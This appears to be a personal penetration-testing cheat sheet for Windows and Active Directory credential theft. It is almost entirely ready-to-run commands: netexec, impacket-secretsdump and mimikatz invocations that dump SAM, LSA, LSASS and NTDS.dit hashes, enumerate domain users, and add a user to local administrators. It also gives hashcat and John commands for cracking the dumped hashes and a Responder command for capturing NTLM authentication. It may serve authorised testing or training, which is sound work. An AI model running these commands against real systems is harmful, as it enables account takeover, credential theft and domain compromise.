## Commands
- Add domain user as Local admin
```bash
net localgroup "administrators" user /add
```
- Verify
```bash
netexec smb ips -u adiaz -p 'Peru123.' 
```
**dump SAM - requires local admin**
```bash
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam  
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
```

**dump LSASS - requires local admin**
```bash
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M lsassy  
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump  
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
```

**dump LSA - requires local admin + domain user** 
```bash
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa  
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump  
netexec smb 192.168.1.13 -u adiaz -p "Peru123." --lsa | awk '{print $5}' | fgrep '/' | sed 's/:$//' | tee mscash_hashes
```

**Cracking mscash hashes:**

```bash
hashcat -m 2100 mscash_hashes /Users/hcn/seclists/Passwords/Leaked-Databases/rockyou.txt -r /Users/hcn/Downloads/hashcat/rules/best66.rule
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
```
- convert for hashcat format
```bash
 sed 's/.*://' mscash_hashes > mscash_hashes_clean

```
**Dump NTDS.dit - Requires domain admin or local admin on DC**
```
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt  
impacket-secretsdump 'user1':'Password1!'@10.10.175.62 -just-dc-ntlm -outputfile test.txt
```

**Get user list of all users in the domain (do against DC to get all domain users):**
```
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '' -f2 | tee users.txt
```

**Recommended to dump with this too just in case. We wanna make sure we have all hashes:**
[mimikatz | Hashdump]()

**Cracking NT hashes (may be needed for RDP access for instance):**
```
john test.txt.ntds --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

## Interesting Locations 
- Windows.old `c:\windows.old\windows\System32\`
- PowerShell history
```powershell
type (Get-PSReadlineOption).HistorySavePath
```
- Custom tools -> hardcoded strings
- Hardcoded creds in config files
- Sticky notes SQLite DB
- PuTTY stored creds on registry
- Third party software stored credentials
## Dumping

## Dump All Hashes Remotely
https://www.hackingarticles.in/credential-dumping-with-netexec-nxc/

### SAM and LSA
[All theory and  commands](https://www.thehacker.recipes/ad/movement/credentials/dumping/)

| Hive     | Details                                                       | Format or credential material                                                                                                                       |
| -------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| SAM      | stores local account credentials (referred to as SAM secrets) | LM or NT hashes                                                                                                                                     |
| SECURITY | stores domain cached credentials (referred to as LSA secrets) | Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (`L$`_`SQSA`_`<SID>`) |
| SYSTEM   | contains enough info to decrypt SAM secrets and LSA secrets   | N/A                                                                                                                                                 |
```bash
impacket-secretsdump -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```

```mimikatz
privilege::debug
# If you are administrator -> need to elevate to system , otherwise no need the next step
token::elevate
lsadump::sam
lsadump::secrets
lsadump::lsa
```
- if mimikatz is used via evil-winrm, try the following [commands](https://medium.com/@nataanakuria/post-exploitation-report-credential-dumping-privilege-escalation-using-mimikatz-cc0601e86881) instead of interactive shell 
- Windows.old may have SAM, SECURITY, SYSTEM

### Mimikatz issue solution
- impacket-secretsdump
```
# Local SAM + LSA secrets (equivalent to lsadump::sam + lsadump::secrets) - needs admin creds
impacket-secretsdump DOMAIN/user:password@target
# or with hash
secretsdump.py -hashes LM:NT DOMAIN/user@target

# This single command dumps SAM, LSA secrets, and cached domain creds all together
```

Output sections map directly:
- `[*] Dumping local SAM hashes` → equivalent to `lsadump::sam`
- `[*] Dumping LSA Secrets` → equivalent to `lsadump::secrets`
- `[*] Dumping cached domain logon information` → equivalent to `lsadump::lsa` (cached creds)

### LSASS secrets
The Local Security Authority Subsystem Service (LSASS) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. Those operations lead to the storage of credential material in the process memory of LSASS. With administrative rights only, this material can be harvested (either locally or remotely).
```mimikatz
sekurlsa::logonpasswords
```

### DPAPI
The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the user's directory and are secured by user-specific master keys derived from the user's password.
[All theory and commands](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
[Writeup](https://medium.com/@mkirahmet/voleur-windows-active-directory-pentest-walkthrough-6d3703e53aae)

### NTDS secrets
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
[Read more](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)

## Cracking
| Hash Type    | Hashcat Mode |
| ------------ | ------------ |
| NTLM         | 1000         |
| NetNTLMv2    | 5600         |
| AS-REP Roast | 18200        |
| Kerberoast   | 13100        |
| MSSQL        | 1731         |
| MSCache      | 2100         |
- rules file
```
/Users/hcn/Downloads/hashcat/rules/best66.rule
```
### Identifying 
- nth shows hashcat, JtR modes too. More reliable than other tools.
```
nth -f hash.txt
```

```
hashcat --identify hash.file
```

```
hashid hash.file
```

```
hash-identifier #Then enter the hash
```

- John auto detects hashes. You can manually specify the format. The supported formats can be seen with `--list=formats` and `--list=subformats`.
### Rule based attacks
#### Hashcat
- [Hashcat Rule Based Attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
```
hashcat -m 1000 challenge1.txt /Users/hcn/seclists/Passwords/Leaked-Databases/rockyou.txt -r challenge1.rule
```
#### John
```
john --rules=CapYear --format=NT --wordlist=/Users/hcn/seclists/Passwords/Leaked-Databases/rockyou.txt challenge1.txt
```

```
[List.Rules:CapYear]
c Az"2026!"
```
- John config file - `/opt/homebrew/share/john/john.conf`
- unshadow tool for linux creds
- Don't use parrotsec mimikatz. It may have some problems. Use this instead https://github.com/gentilkiwi/mimikatz
### NTLM Capture
- Responder
```bash
sudo responder -I tun0 
```
